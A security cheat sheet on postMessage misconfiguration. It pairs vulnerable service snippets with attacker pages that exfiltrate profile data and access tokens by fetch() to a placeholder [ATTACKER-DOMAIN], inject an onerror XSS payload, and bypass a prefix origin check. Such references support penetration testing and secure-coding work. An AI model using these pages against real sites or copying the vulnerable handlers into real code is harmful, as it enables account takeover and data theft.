# postMessage Misconfiguration

## Table of Contents

- [Data Exfiltration](#data-exfiltration)
- [Account Takeover](#account-takeover)
- [XSS](#xss)

## Data Exfiltration

### A message sent with the wildcard target origin is delivered to whichever site embeds the page, including the attacker's. [^1]

- Reading data that an embedded widget sends to its parent
    1. Code in the service
        ```javascript
        // '*' delivers the message regardless of the parent's origin
        window.parent.postMessage({ type: 'profile', email: user.email, phone: user.phone }, '*');
        ```

    2. Page on the attacker's domain
        ```html
        <iframe src="https://[VULNERABLE-SERVICE]/widget/profile"></iframe>
        <script>
            window.addEventListener('message', (event) => {
                fetch('https://[ATTACKER-DOMAIN]/', {
                    method: 'POST',
                    body: JSON.stringify(event.data)
                });
            });
        </script>
        ```

## Account Takeover

### A sign-in popup that sends its token to the opener with the wildcard target origin hands the token to any page that opens it. [^2]

- Capturing a token from a sign-in popup
    1. Code in the popup
        ```javascript
        window.opener.postMessage({ access_token: token }, '*');
        ```

    2. Page on the attacker's domain
        ```html
        <button id="start">Continue</button>
        <script>
            window.addEventListener('message', (event) => {
                fetch(`https://[ATTACKER-DOMAIN]/?token=${event.data.access_token}`);
            });

            // Popups require a user gesture, so the window is opened on the victim's click
            document.getElementById('start').onclick = () => {
                window.open('https://[VULNERABLE-SERVICE]/auth/popup');
            };
        </script>
        ```
    The popup is a top-level page, so it is loaded with the victim's session even under the `SameSite=Lax` default.

## XSS

### A message handler that does not check the sender passes attacker-controlled data to a dangerous sink on the trusted origin.

- Writing message data into the page
    1. Code in the service
        ```javascript
        window.addEventListener('message', (event) => {
            // event.origin is never checked
            document.getElementById('notice').innerHTML = event.data.html;
        });
        ```

    2. Page on the attacker's domain
        ```html
        <button id="start">Continue</button>
        <script>
            document.getElementById('start').onclick = () => {
                const target = window.open('https://[VULNERABLE-SERVICE]/dashboard');

                setTimeout(() => {
                    target.postMessage({ html: '<img src=x onerror=alert(document.domain)>' }, '*');
                }, 3000);
            };
        </script>
        ```

- Bypassing an origin check that matches a prefix
    1. Code in the service
        ```javascript
        window.addEventListener('message', (event) => {
            if (!event.origin.startsWith('https://[VULNERABLE-SERVICE]')) {
                return;
            }
            document.getElementById('notice').innerHTML = event.data.html;
        });
        ```

    2. Origin the attacker sends the message from
        ```text
        https://[VULNERABLE-SERVICE].[ATTACKER-DOMAIN]
        ```

[^1]: Applies when the page can be framed by other sites and its session cookie is set with `SameSite=None`. Otherwise, the framed widget is loaded without the victim's session.
[^2]: Applies when the popup does not set `Cross-Origin-Opener-Policy: same-origin`, which would remove its reference to the opener.
